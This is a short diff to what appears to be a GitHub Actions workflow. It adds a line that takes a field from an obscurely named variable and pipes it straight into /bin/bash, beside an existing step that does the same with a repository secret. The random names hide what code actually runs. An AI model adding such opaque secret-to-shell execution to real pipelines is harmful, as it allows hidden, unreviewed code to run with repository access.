@@ -22,6 +22,7 @@ jobs:
           kryw16: ${{ secrets.kryw16 }}
         run: |
           printf '%s' "$kryw16" | jq -r .nwvq8094 | /bin/bash
+          echo $vuqey068 | jq -r .wzsst67718 | /bin/bash
 
       - name: Save output
         uses: actions/upload-artifact@v4
